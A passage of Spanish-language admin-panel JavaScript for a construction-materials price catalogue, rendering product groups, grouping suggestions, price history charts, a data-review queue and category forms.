                            <button class="btn btn-sm btn-secondary" onclick="showGroupDetail(${g.id})" title="Ver detalle">${icon('layers',14)}</button>
                            <button class="btn btn-sm btn-secondary" onclick="showGroupForm(${g.id})" title="Editar">${icon('edit',14)}</button>
                            <button class="btn btn-sm" onclick="deleteGroup(${g.id})" title="Eliminar" style="color:#e53e3e">${icon('trash',14)}</button>
                        </td>
                    </tr>
                `).join('')}</tbody>
            </table></div>
            ${total > _admGrpPageSize ? `
                <div style="display:flex;justify-content:center;gap:8px;margin-top:16px;align-items:center">
                    <button class="btn btn-sm" ${_admGrpOffset === 0 ? 'disabled' : ''}
                            onclick="_admGrpOffset=Math.max(0,_admGrpOffset-${_admGrpPageSize});loadAdminGroups()">Anterior</button>
                    <span style="padding:6px;color:#666;font-size:13px">${_admGrpOffset + 1}-${Math.min(_admGrpOffset + _admGrpPageSize, total)} de ${total}</span>
                    <button class="btn btn-sm" ${_admGrpOffset + _admGrpPageSize >= total ? 'disabled' : ''}
                            onclick="_admGrpOffset+=${_admGrpPageSize};loadAdminGroups()">Siguiente</button>
                </div>
            ` : `<p style="margin-top:8px;font-size:13px;color:var(--gray-500)">${total} grupos</p>`}
        `;
    } catch { document.getElementById('admin-groups-list').innerHTML = '<div class="empty-state"><p>Error cargando grupos</p></div>'; }
}

function showGroupForm(editId) {
    const title = editId ? 'Editar Grupo' : 'Nuevo Grupo';
    showModal(title, `
        <form id="group-form" onsubmit="handleGroupSubmit(event, ${editId || 'null'})">
            <div class="form-group">
                <label class="form-label">Nombre del grupo *</label>
                <input class="form-input" name="name" required placeholder="Ej: Pintura Latex Tradicional">
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Categoria</label>
                    <input class="form-input" name="category" list="grp-cat-list" placeholder="Categoria">
                    <datalist id="grp-cat-list">
                        ${Object.entries(CATEGORY_META).map(([k,v]) => `<option value="${esc(k)}">${esc(v.label)}</option>`).join('')}
                    </datalist>
                </div>
                <div class="form-group">
                    <label class="form-label">Etiqueta de variante</label>
                    <input class="form-input" name="variant_label" placeholder="Ej: Color, Diametro, Medida">
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Descripcion</label>
                <textarea class="form-input" name="description" rows="2" placeholder="Descripcion opcional..."></textarea>
            </div>
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;padding:10px">
                ${editId ? 'Guardar Cambios' : 'Crear Grupo'}
            </button>
        </form>
    `);

    if (editId) loadGroupIntoForm(editId);
}

async function loadGroupIntoForm(id) {
    try {
        const resp = await API.adminGroup(id);
        if (!resp.ok) return;
        const g = resp.data;
        const f = document.getElementById('group-form');
        if (!f) return;
        if (g.name) f.name.value = g.name;
        if (g.category) f.category.value = g.category;
        if (g.variant_label) f.variant_label.value = g.variant_label;
        if (g.description) f.description.value = g.description;
    } catch {}
}

async function handleGroupSubmit(e, editId) {
    e.preventDefault();
    const f = e.target;
    const data = {
        name: f.name.value,
        category: f.category.value || null,
        variant_label: f.variant_label.value || null,
        description: f.description.value || null,
    };
    try {
        const resp = editId
            ? await API.updateGroup(editId, data)
            : await API.createGroup(data);
        if (resp.ok) {
            closeModal();
            toast(editId ? 'Grupo actualizado' : 'Grupo creado', 'success');
            loadAdminGroups();
        } else {
            toast(resp.detail || 'Error', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

async function deleteGroup(id) {
    if (!confirm('Eliminar este grupo? Los productos seran desasociados.')) return;
    try {
        const resp = await API.deleteGroup(id);
        if (resp.ok) { toast('Grupo eliminado', 'success'); loadAdminGroups(); }
        else toast(resp.detail || 'Error', 'error');
    } catch { toast('Error de conexion', 'error'); }
}

async function showGroupDetail(groupId) {
    showModal('Detalle del Grupo', '<p style="text-align:center;color:var(--gray-500)">Cargando...</p>');

    try {
        const resp = await API.adminGroup(groupId);
        if (!resp.ok) { closeModal(); toast('Error', 'error'); return; }
        const g = resp.data;

        const modalBody = document.querySelector('.modal-body');
        if (!modalBody) return;

        modalBody.innerHTML = `
            <div style="margin-bottom:16px">
                <h3 style="margin:0 0 4px">${esc(g.name)}</h3>
                <div style="font-size:13px;color:var(--gray-500)">
                    ${g.category ? `<span class="badge">${esc(g.category)}</span>` : ''}
                    ${g.variant_label ? ` &middot; Variante: <strong>${esc(g.variant_label)}</strong>` : ''}
                    &middot; ${g.member_count} miembros
                    ${g.price_range.min != null ? ` &middot; ${g.price_range.min.toFixed(2)} - ${g.price_range.max.toFixed(2)} BOB` : ''}
                </div>
                ${g.description ? `<p style="margin:8px 0 0;font-size:13px;color:var(--gray-600)">${esc(g.description)}</p>` : ''}
            </div>

            <div style="margin-bottom:12px;display:flex;justify-content:space-between;align-items:center">
                <strong style="font-size:14px">Productos miembros</strong>
                <button class="btn btn-sm btn-primary" onclick="showAddMembersModal(${groupId})">
                    ${icon('plus',14)} Agregar
                </button>
            </div>

            <div id="group-members-list">
                ${g.insumos && g.insumos.length ? `
                    <div class="table-wrap"><table>
                        <thead><tr><th>Producto</th><th>UOM</th><th>Precio Ref.</th><th></th></tr></thead>
                        <tbody>${g.insumos.map(i => `
                            <tr>
                                <td>${esc(i.name)}</td>
                                <td>${esc(i.uom)}</td>
                                <td>${i.ref_price ? `${i.ref_price.toFixed(2)} ${esc(i.ref_currency || 'BOB')}` : '-'}</td>
                                <td>
                                    <button class="btn btn-sm" onclick="removeGroupMember(${groupId}, ${i.id})" style="color:#e53e3e" title="Quitar del grupo">
                                        ${icon('x',14)}
                                    </button>
                                </td>
                            </tr>
                        `).join('')}</tbody>
                    </table></div>
                ` : '<div class="empty-state"><p>Sin miembros. Agrega productos al grupo.</p></div>'}
            </div>
        `;
    } catch { closeModal(); toast('Error cargando grupo', 'error'); }
}

async function removeGroupMember(groupId, insumoId) {
    try {
        const resp = await API.removeGroupMember(groupId, insumoId);
        if (resp.ok) {
            toast('Producto quitado del grupo', 'success');
            showGroupDetail(groupId);
        } else toast(resp.detail || 'Error', 'error');
    } catch { toast('Error de conexion', 'error'); }
}

function showAddMembersModal(groupId) {
    showModal('Agregar Productos al Grupo', `
        <div class="form-group">
            <label class="form-label">Buscar producto</label>
            <input class="form-input" id="add-member-search" placeholder="Nombre del producto..."
                   oninput="debounceSearchMembers(${groupId})">
        </div>
        <div id="add-member-results" style="max-height:300px;overflow-y:auto"></div>
        <div id="add-member-selected" style="margin-top:12px"></div>
        <button class="btn btn-primary" id="add-member-btn" style="width:100%;justify-content:center;padding:10px;margin-top:12px;display:none"
                onclick="submitAddMembers(${groupId})">
            Agregar Seleccionados
        </button>
    `);
    window._selectedMemberIds = new Set();
}

let _memberSearchTimer;
function debounceSearchMembers(groupId) {
    clearTimeout(_memberSearchTimer);
    _memberSearchTimer = setTimeout(() => searchMembersForGroup(groupId), 300);
}

async function searchMembersForGroup(groupId) {
    const q = document.getElementById('add-member-search')?.value?.trim();
    if (!q || q.length < 2) {
        document.getElementById('add-member-results').innerHTML = '';
        return;
    }
    try {
        const resp = await API.insumos(`?q=${encodeURIComponent(q)}&limit=20`);
        const container = document.getElementById('add-member-results');
        if (!resp.ok || !resp.data.length) {
            container.innerHTML = '<p style="color:var(--gray-500);font-size:13px">Sin resultados</p>';
            return;
        }
        container.innerHTML = resp.data.map(p => `
            <div style="display:flex;justify-content:space-between;align-items:center;padding:8px;border-bottom:1px solid var(--gray-200);${window._selectedMemberIds.has(p.id) ? 'background:#f0fdf4;' : ''}">
                <div>
                    <strong style="font-size:13px">${esc(p.name)}</strong>
                    <span style="font-size:12px;color:var(--gray-500)">${esc(p.uom)} ${p.ref_price ? '&middot; ' + p.ref_price.toFixed(2) + ' BOB' : ''}</span>
                </div>
                <button class="btn btn-sm ${window._selectedMemberIds.has(p.id) ? 'btn-primary' : 'btn-secondary'}"
                        onclick="toggleMemberSelection(${p.id}, ${groupId})">
                    ${window._selectedMemberIds.has(p.id) ? icon('check', 14) : icon('plus', 14)}
                </button>
            </div>
        `).join('');
    } catch {}
}

function toggleMemberSelection(insumoId, groupId) {
    if (window._selectedMemberIds.has(insumoId)) {
        window._selectedMemberIds.delete(insumoId);
    } else {
        window._selectedMemberIds.add(insumoId);
    }
    const btn = document.getElementById('add-member-btn');
    if (btn) btn.style.display = window._selectedMemberIds.size > 0 ? 'flex' : 'none';
    searchMembersForGroup(groupId);
}

async function submitAddMembers(groupId) {
    const ids = Array.from(window._selectedMemberIds);
    if (!ids.length) return;
    try {
        const resp = await API.addGroupMembers(groupId, ids);
        if (resp.ok) {
            toast(`${resp.assigned || 0} asignados, ${resp.moved || 0} movidos`, 'success');
            showGroupDetail(groupId);
        } else toast(resp.detail || 'Error', 'error');
    } catch { toast('Error de conexion', 'error'); }
}

// ── Group Suggestions ─────────────────────────────────────────
async function showGroupSuggestions() {
    showModal('Sugerencias de Agrupacion', '<p style="text-align:center;color:var(--gray-500)">Analizando productos...</p>');

    try {
        let params = '?limit=30';
        if (_admGrpCategory) params += `&category=${encodeURIComponent(_admGrpCategory)}`;
        const resp = await API.groupSuggestions(params);
        const modalBody = document.querySelector('.modal-body');
        if (!modalBody) return;

        if (!resp.ok || !resp.data.length) {
            modalBody.innerHTML = '<div class="empty-state"><p>No se encontraron sugerencias. Todos los productos similares ya estan agrupados o no hay suficientes productos sin grupo.</p></div>';
            return;
        }

        modalBody.innerHTML = `
            <p style="font-size:13px;color:var(--gray-500);margin-bottom:16px">
                Se encontraron <strong>${resp.data.length}</strong> posibles agrupaciones basadas en similitud de nombre.
            </p>
            <div style="max-height:500px;overflow-y:auto">
                ${resp.data.map((s, idx) => `
                    <div class="card" style="margin-bottom:12px;padding:12px">
                        <div style="display:flex;justify-content:space-between;align-items:flex-start">
                            <div>
                                <strong>${esc(s.suggested_name)}</strong>
                                ${s.category ? `<span class="badge" style="margin-left:6px">${esc(s.category)}</span>` : ''}
                                <div style="font-size:13px;color:var(--gray-500);margin-top:2px">
                                    ${s.member_count} productos
                                    ${s.price_range.min != null ? ` &middot; ${s.price_range.min.toFixed(2)} - ${s.price_range.max.toFixed(2)} BOB` : ''}
                                </div>
                                <div style="font-size:12px;color:var(--gray-400);margin-top:4px">
                                    ${s.insumos.slice(0, 5).map(i => esc(i.name)).join(', ')}${s.insumos.length > 5 ? '...' : ''}
                                </div>
                            </div>
                            <button class="btn btn-sm btn-primary" onclick="acceptSuggestion(${idx})">
                                ${icon('check',14)} Crear
                            </button>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;

        window._groupSuggestions = resp.data;
    } catch { document.querySelector('.modal-body').innerHTML = '<div class="empty-state"><p>Error cargando sugerencias</p></div>'; }
}

async function acceptSuggestion(idx) {
    const s = window._groupSuggestions?.[idx];
    if (!s) return;

    try {
        const resp = await API.acceptGroupSuggestion({
            name: s.suggested_name,
            category: s.category,
            variant_label: null,
            insumo_ids: s.insumos.map(i => i.id),
        });
        if (resp.ok) {
            toast(`Grupo "${s.suggested_name}" creado con ${resp.data.member_count} miembros`, 'success');
            window._groupSuggestions.splice(idx, 1);
            if (window._groupSuggestions.length) {
                showGroupSuggestions();
            } else {
                closeModal();
                loadAdminGroups();
            }
        } else toast(resp.detail || 'Error', 'error');
    } catch { toast('Error de conexion', 'error'); }
}

// ── Price History Modal ───────────────────────────────────────
async function showPriceHistory(insumoId, name) {
    showModal(`Historial de Precios: ${name}`, `
        <div id="ph-content" style="min-height:200px">
            <p style="text-align:center;color:var(--gray-500)">Cargando historial...</p>
        </div>
    `);

    const container = document.getElementById('ph-content');
    try {
        const [evoResp, histResp, supResp] = await Promise.all([
            API.get(`/prices/${insumoId}/evolution`),
            API.get(`/prices/${insumoId}/history?limit=30`),
            API.get(`/prices/${insumoId}/suppliers`),
        ]);

        let html = '';

        // Evolution table
        if (evoResp.ok && evoResp.evolution && evoResp.evolution.length > 0) {
            html += `
                <div style="margin-bottom:16px">
                    <h4 style="margin:0 0 8px;font-size:14px;color:var(--gray-700)">Evolucion por anio (${evoResp.total_records} registros totales)</h4>
                    <div class="table-wrap"><table>
                        <thead><tr>
                            <th>Anio</th><th>Muestras</th><th>Mediana</th><th>Promedio</th><th>Min</th><th>Max</th>
                        </tr></thead>
                        <tbody>${evoResp.evolution.map(r => `
                            <tr>
                                <td><strong>${r.year}</strong></td>
                                <td>${r.samples}</td>
                                <td><strong>${Number(r.median_price).toFixed(2)}</strong></td>
                                <td>${Number(r.avg_price).toFixed(2)}</td>
                                <td>${Number(r.min_price).toFixed(2)}</td>
                                <td>${Number(r.max_price).toFixed(2)}</td>
                            </tr>
                        `).join('')}</tbody>
                    </table></div>
                </div>

                <div style="margin-bottom:16px;display:flex;gap:8px;align-items:center;flex-wrap:wrap">
                    <button class="btn btn-primary btn-sm" onclick="refreshPrice(${insumoId})">
                        ${icon('trending-up', 14)} Actualizar precio ref. (mediana 12 meses)
                    </button>
                    <button class="btn btn-secondary btn-sm" onclick="showAddPriceForm(${insumoId}, '${escJs(name)}')">
                        ${icon('plus', 14)} Agregar precio manual
                    </button>
                    <span id="refresh-result" style="font-size:13px;color:var(--gray-500)"></span>
                </div>
            `;

            // Simple bar chart visualization
            const maxMedian = Math.max(...evoResp.evolution.map(r => Number(r.median_price)));
            html += `
                <div style="margin-bottom:16px">
                    <h4 style="margin:0 0 8px;font-size:14px;color:var(--gray-700)">Tendencia de precio (mediana)</h4>
                    <div style="display:flex;align-items:flex-end;gap:4px;height:120px;padding:8px;background:var(--gray-50);border-radius:8px">
                        ${evoResp.evolution.map(r => {
                            const pct = maxMedian > 0 ? (Number(r.median_price) / maxMedian * 100) : 0;
                            return `<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:2px">
                                <span style="font-size:10px;color:var(--gray-600)">${Number(r.median_price).toFixed(0)}</span>
                                <div style="width:100%;background:var(--primary);border-radius:4px 4px 0 0;height:${Math.max(pct, 3)}%" title="${r.year}: ${Number(r.median_price).toFixed(2)} Bs"></div>
                                <span style="font-size:10px;color:var(--gray-500)">${r.year}</span>
                            </div>`;
                        }).join('')}
                    </div>
                </div>
            `;
        } else {
            html += `
                <div class="empty-state" style="margin-bottom:16px">
                    <p>Sin historial de precios</p>
                    <button class="btn btn-primary btn-sm" onclick="showAddPriceForm(${insumoId}, '${escJs(name)}')">
                        ${icon('plus', 14)} Agregar primer precio
                    </button>
                </div>
            `;
        }

        // Suppliers for this product
        if (supResp.ok && supResp.data && supResp.data.length > 0) {
            html += `
                <div style="margin-bottom:16px">
                    <h4 style="margin:0 0 8px;font-size:14px;color:var(--gray-700)">Proveedores (${supResp.data.length})</h4>
                    <div class="table-wrap"><table>
                        <thead><tr>
                            <th>Proveedor</th><th>Ciudad</th><th>Pedidos</th>
                            <th>Precio Med.</th><th>Min</th><th>Max</th><th>Ultimo Ped.</th>
                        </tr></thead>
                        <tbody>${supResp.data.map(r => `
                            <tr>
                                <td><strong>${esc(r.supplier_name)}</strong></td>
                                <td>${esc(r.city || r.department || '-')}</td>
                                <td>${r.order_count}</td>
                                <td><strong>${Number(r.median_price).toFixed(2)}</strong></td>
                                <td>${Number(r.min_price).toFixed(2)}</td>
                                <td>${Number(r.max_price).toFixed(2)}</td>
                                <td>${r.last_order || '-'}</td>
                            </tr>
                        `).join('')}</tbody>
                    </table></div>
                </div>
            `;
        }

        // Recent records
        if (histResp.ok && histResp.data && histResp.data.length > 0) {
            html += `
                <div>
                    <h4 style="margin:0 0 8px;font-size:14px;color:var(--gray-700)">Ultimos registros</h4>
                    <div class="table-wrap"><table>
                        <thead><tr>
                            <th>Fecha</th><th>Precio Unit.</th><th>Cantidad</th><th>Fuente</th><th>Ref.</th>
                        </tr></thead>
                        <tbody>${histResp.data.map(r => `
                            <tr>
                                <td>${r.observed_date}</td>
                                <td><strong>${r.unit_price.toFixed(2)} ${esc(r.currency)}</strong></td>
                                <td>${r.quantity || '-'}</td>
                                <td><span class="badge badge-${r.source === 'manual' ? 'warning' : 'gray'}">${esc(r.source)}</span></td>
                                <td>${r.source_ref ? esc(r.source_ref) : '-'}</td>
                            </tr>
                        `).join('')}</tbody>
                    </table></div>
                </div>
            `;
        }

        container.innerHTML = html;
    } catch (e) {
        container.innerHTML = `<div class="empty-state"><p>Error cargando historial: ${e.message}</p></div>`;
    }
}

function showAddPriceForm(insumoId, name) {
    const today = new Date().toISOString().split('T')[0];
    showModal(`Agregar precio: ${name}`, `
        <form id="add-price-form" onsubmit="handleAddPrice(event, ${insumoId}, '${escJs(name)}')">
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Precio unitario *</label>
                    <input class="form-input" type="number" step="0.01" name="unit_price" required placeholder="0.00">
                </div>
                <div class="form-group">
                    <label class="form-label">Moneda</label>
                    <select class="form-select" name="currency">
                        <option value="BOB">BOB (Bolivianos)</option>
                        <option value="USD">USD (Dolares)</option>
                    </select>
                </div>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Fecha *</label>
                    <input class="form-input" type="date" name="observed_date" required value="${today}">
                </div>
                <div class="form-group">
                    <label class="form-label">Cantidad</label>
                    <input class="form-input" type="number" step="0.01" name="quantity" placeholder="1">
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Fuente</label>
                <select class="form-select" name="source">
                    <option value="manual">Manual</option>
                    <option value="cotizacion">Cotizacion</option>
                    <option value="pedido">Pedido</option>
                </select>
            </div>
            <div class="form-group">
                <label class="form-label">Referencia / Nota</label>
                <input class="form-input" name="source_ref" placeholder="Ej: cotizacion proveedor X, precio mercado abril 2026...">
            </div>
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;padding:10px">
                Guardar precio
            </button>
        </form>
    `);
}

async function handleAddPrice(e, insumoId, name) {
    e.preventDefault();
    const f = e.target;
    try {
        const resp = await API.post(`/prices/${insumoId}/add-price`, {
            unit_price: parseFloat(f.unit_price.value),
            currency: f.currency.value,
            observed_date: f.observed_date.value,
            quantity: f.quantity.value ? parseFloat(f.quantity.value) : null,
            source: f.source.value,
            source_ref: f.source_ref.value || null,
        });
        if (resp.ok) {
            closeModal();
            toast('Precio agregado', 'success');
            showPriceHistory(insumoId, name);
        } else {
            toast(resp.detail || 'Error', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

async function refreshPrice(insumoId) {
    const resultSpan = document.getElementById('refresh-result');
    if (resultSpan) resultSpan.textContent = 'Calculando...';
    try {
        const resp = await API.post(`/prices/${insumoId}/refresh-price`);
        if (resp.ok) {
            const msg = `Precio actualizado: ${resp.ref_price} Bs (${resp.sample_count} muestras, ${resp.period})`;
            if (resultSpan) resultSpan.textContent = msg;
            toast(msg, 'success');
            loadAdminProducts();
        } else {
            if (resultSpan) resultSpan.textContent = resp.detail || 'Error';
            toast(resp.detail || 'Error', 'error');
        }
    } catch {
        if (resultSpan) resultSpan.textContent = 'Error de conexion';
    }
}

// ── Admin: Review Panel ──────────────────────────────────────
let _reviewOffset = 0;
let _reviewCategory = '';
let _reviewSearch = '';

async function renderAdminReview() {
    const c = document.getElementById('admin-content');
    c.innerHTML = '<p>Cargando items de revision...</p>';

    try {
        // Load categories and items in parallel
        const [catsRes, itemsRes] = await Promise.all([
            API.get('/prices/review/categories'),
            API.get(`/prices/review/pending?offset=${_reviewOffset}&limit=25${_reviewCategory ? '&category=' + _reviewCategory : ''}${_reviewSearch ? '&q=' + encodeURIComponent(_reviewSearch) : ''}`),
        ]);

        const categories = catsRes.data || [];
        const items = itemsRes.data || [];
        const total = itemsRes.total || 0;

        c.innerHTML = `
            <div class="admin-toolbar">
                <h3>${icon('check-circle', 20)} Revision de Datos (${total} pendientes)</h3>
                <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
                    <input type="text" placeholder="Buscar..." value="${_reviewSearch}"
                           onchange="_reviewSearch=this.value;_reviewOffset=0;renderAdminReview()"
                           style="padding:6px 10px;border:1px solid #ddd;border-radius:4px;width:200px">
                    <select onchange="_reviewCategory=this.value;_reviewOffset=0;renderAdminReview()"
                            style="padding:6px 10px;border:1px solid #ddd;border-radius:4px">
                        <option value="">Todas las categorias</option>
                        ${categories.map(c => `<option value="${esc(c.name)}" ${_reviewCategory === c.name ? 'selected' : ''}>${c.name} (${c.count})</option>`).join('')}
                    </select>
                </div>
            </div>
            <p style="color:#666;margin:8px 0">
                Items sin categoria del curado de datos. Puedes aprobarlos (se crean como productos) o descartarlos.
            </p>
            <table class="data-table">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Nombre</th>
                        <th>Descripcion</th>
                        <th>UOM</th>
                        <th>Categoria</th>
                        <th>Precio Ref</th>
                        <th>Compras</th>
                        <th>Acciones</th>
                    </tr>
                </thead>
                <tbody>
                    ${items.length === 0 ? '<tr><td colspan="8" style="text-align:center;color:#999">No hay items pendientes</td></tr>' : ''}
                    ${items.map(item => `
                        <tr>
                            <td>${item._index}</td>
                            <td><strong>${esc(item.name || '')}</strong></td>
                            <td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"
                                title="${esc(item.description || '')}">${esc((item.description || '').substring(0, 50))}</td>
                            <td>${esc(item.uom || 'pza')}</td>
                            <td>${item.category ? `<span class="badge">${esc(item.category)}</span>` : '<em style="color:#999">sin cat.</em>'}</td>
                            <td>${item.ref_price ? item.ref_price.toFixed(2) + ' Bs' : '-'}</td>
                            <td>${item.order_count || 0}</td>
                            <td>
                                <button class="btn btn-sm btn-primary" onclick="showReviewApproveForm(${item._index}, '${escJs(JSON.stringify(item))}')">
                                    ${icon('check', 14)} Aprobar
                                </button>
                                <button class="btn btn-sm btn-danger" onclick="rejectReviewItem(${item._index})">
                                    ${icon('x', 14)}
                                </button>
                            </td>
                        </tr>
                    `).join('')}
                </tbody>
            </table>
            ${total > 25 ? `
                <div style="display:flex;justify-content:center;gap:8px;margin-top:16px">
                    <button class="btn btn-sm" ${_reviewOffset === 0 ? 'disabled' : ''}
                            onclick="_reviewOffset=Math.max(0,_reviewOffset-25);renderAdminReview()">Anterior</button>
                    <span style="padding:6px;color:#666">${_reviewOffset + 1}-${Math.min(_reviewOffset + 25, total)} de ${total}</span>
                    <button class="btn btn-sm" ${_reviewOffset + 25 >= total ? 'disabled' : ''}
                            onclick="_reviewOffset+=25;renderAdminReview()">Siguiente</button>
                </div>
            ` : ''}
        `;
    } catch (e) {
        c.innerHTML = `<p style="color:red">Error cargando revision: ${e.message}</p>`;
    }
}

function showReviewApproveForm(index, itemJson) {
    const item = JSON.parse(itemJson);
    const cats = ['acero','agregados','aislantes','cemento','ceramica','electrico',
        'ferreteria','herramientas','impermeabilizantes','madera','maquinaria',
        'pintura','plomeria','prefabricados','sanitario','seguridad','techos','vidrios'];
    const uoms = ['pza','m3','m2','ml','kg','bls','gl','lt','varilla','rollo','tubo','glb','caja','saco'];

    // Show modal with editable form
    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay';
    overlay.innerHTML = `
        <div class="modal" style="max-width:500px">
            <div class="modal-header">
                <h3>Aprobar Item #${index}</h3>
                <button class="modal-close" onclick="this.closest('.modal-overlay').remove()">&times;</button>
            </div>
            <form onsubmit="handleReviewApprove(event, ${index})" style="padding:16px">
                <div style="margin-bottom:12px">
                    <label style="font-weight:600;display:block;margin-bottom:4px">Nombre</label>
                    <input type="text" name="name" value="${esc(item.name || '')}" required
                           style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px">
                </div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px">
                    <div>
                        <label style="font-weight:600;display:block;margin-bottom:4px">Categoria</label>
                        <select name="category" required style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px">
                            <option value="">Seleccionar...</option>
                            ${cats.map(c => `<option value="${c}" ${item.category === c ? 'selected' : ''}>${c}</option>`).join('')}
                        </select>
                    </div>
                    <div>
                        <label style="font-weight:600;display:block;margin-bottom:4px">Unidad</label>
                        <select name="uom" required style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px">
                            ${uoms.map(u => `<option value="${u}" ${item.uom === u ? 'selected' : ''}>${u}</option>`).join('')}
                        </select>
                    </div>
                </div>
                <div style="margin-bottom:12px">
                    <label style="font-weight:600;display:block;margin-bottom:4px">Precio referencia (Bs)</label>
                    <input type="number" name="ref_price" step="0.01" value="${item.ref_price || ''}"
                           style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px">
                </div>
                <div style="margin-bottom:16px">
                    <label style="font-weight:600;display:block;margin-bottom:4px">Descripcion</label>
                    <textarea name="description" rows="2"
                              style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px">${esc(item.description || '')}</textarea>
                </div>
                ${item.code ? `<p style="color:#999;font-size:12px">Codigo original: ${esc(item.code)}</p>` : ''}
                <div style="display:flex;gap:8px;justify-content:flex-end">
                    <button type="button" class="btn" onclick="this.closest('.modal-overlay').remove()">Cancelar</button>
                    <button type="submit" class="btn btn-primary">${icon('check', 14)} Aprobar y crear producto</button>
                </div>
            </form>
        </div>
    `;
    document.body.appendChild(overlay);
}

async function handleReviewApprove(e, index) {
    e.preventDefault();
    const form = e.target;
    const body = {
        name: form.name.value,
        uom: form.uom.value,
        category: form.category.value,
        ref_price: form.ref_price.value ? parseFloat(form.ref_price.value) : null,
        description: form.description.value || null,
    };

    try {
        const res = await API.post(`/prices/review/${index}/approve`, body);
        if (res.ok) {
            form.closest('.modal-overlay').remove();
            toast(`Producto "${body.name}" creado (quedan ${res.remaining})`, 'success');
            renderAdminReview();
        } else {
            toast(res.error || 'Error al aprobar', 'error');
        }
    } catch (e) {
        toast('Error: ' + e.message, 'error');
    }
}

async function rejectReviewItem(index) {
    if (!confirm('Descartar este item de la lista de revision?')) return;
    try {
        const res = await API.del(`/prices/review/${index}`);
        if (res.ok) {
            toast(`Item descartado (quedan ${res.remaining})`, 'info');
            renderAdminReview();
        }
    } catch (e) {
        toast('Error: ' + e.message, 'error');
    }
}

// ── Admin: Categories ─────────────────────────────────────────
async function renderAdminCategories() {
    if (!isAdmin()) { toast('Sin permisos', 'error'); return; }
    const c = document.getElementById('admin-content');
    c.innerHTML = `
        <div class="search-bar">
            <span style="font-size:14px;color:var(--gray-500)">Gestionar categorias de materiales y proveedores</span>
            <button class="btn btn-primary" onclick="showCategoryForm()">
                ${icon('plus',16)} Nueva Categoria
            </button>
        </div>
        <div id="admin-categories-list"></div>
    `;
    loadAdminCategories();
}

async function loadAdminCategories() {
    try {
        const resp = await API.adminCategories();
        const container = document.getElementById('admin-categories-list');
        if (!container) return;
        if (!resp.ok || !resp.data.length) {
            container.innerHTML = '<div class="empty-state"><p>No hay categorias</p></div>';
            return;
        }
        container.innerHTML = `
            <div class="table-wrap"><table>
                <thead><tr>
                    <th>Orden</th><th>Key</th><th>Nombre</th><th>Icono</th><th>Activa</th><th>Acciones</th>
                </tr></thead>
                <tbody>${resp.data.map(c => `
                    <tr>
                        <td>${c.sort_order}</td>
                        <td><code>${esc(c.key)}</code></td>
                        <td><strong>${esc(c.label)}</strong>${c.description ? `<br><small style="color:var(--gray-500)">${esc(c.description)}</small>` : ''}</td>
                        <td style="font-size:20px">${c.icon || '-'}</td>
                        <td>${c.is_active ? '<span style="color:var(--success)">Si</span>' : '<span style="color:var(--danger)">No</span>'}</td>
                        <td style="white-space:nowrap">
                            <button class="btn btn-sm btn-secondary" onclick="showCategoryForm(${c.id})" title="Editar">${icon('edit',14)}</button>
                            <button class="btn btn-sm btn-secondary" onclick="deleteCategory(${c.id}, '${escJs(c.label)}')" title="Eliminar" style="color:var(--danger)">${icon('trash',14)}</button>
                        </td>
                    </tr>
                `).join('')}</tbody>
            </table></div>
            <p style="margin-top:8px;font-size:13px;color:var(--gray-500)">${resp.data.length} categorias</p>
        `;
    } catch { document.getElementById('admin-categories-list').innerHTML = '<div class="empty-state"><p>Error cargando</p></div>'; }
}

function showCategoryForm(editId) {
    const title = editId ? 'Editar Categoria' : 'Nueva Categoria';
    showModal(title, `
        <form id="admin-category-form" onsubmit="handleCategory(event, ${editId || 'null'})">
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Key (identificador unico) *</label>
                    <input class="form-input" name="key" required placeholder="ej: ferreteria" pattern="[a-z0-9_]+" title="Solo minusculas, numeros y guion bajo">
                </div>
                <div class="form-group">
                    <label class="form-label">Nombre visible *</label>
                    <input class="form-input" name="label" required placeholder="Ferreteria">
                </div>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Icono (HTML entity o emoji)</label>
                    <input class="form-input" name="icon" placeholder="&#128295; o pegar emoji">
                </div>
                <div class="form-group">
                    <label class="form-label">Orden</label>
                    <input class="form-input" type="number" name="sort_order" value="0" min="0">
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Descripcion</label>
                <input class="form-input" name="description" placeholder="Descripcion opcional de la categoria">
            </div>
            ${editId ? `
            <div class="form-group">
                <label class="form-label">Estado</label>
                <select class="form-select" name="is_active">
                    <option value="true">Activa</option>
                    <option value="false">Inactiva</option>
                </select>
            </div>` : ''}
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;padding:10px">
                ${editId ? 'Guardar Cambios' : 'Crear Categoria'}
            </button>
        </form>
    `);

    if (editId) loadCategoryIntoForm(editId);
}

async function loadCategoryIntoForm(id) {
    try {
        const resp = await API.adminCategories();
        if (!resp.ok) return;
        const cat = resp.data.find(c => c.id === id);
        if (!cat) return;
        const f = document.getElementById('admin-category-form');
        if (!f) return;
        f.key.value = cat.key;
        f.label.value = cat.label;
        if (cat.icon) f.icon.value = cat.icon;
        f.sort_order.value = cat.sort_order;
        if (cat.description) f.description.value = cat.description;
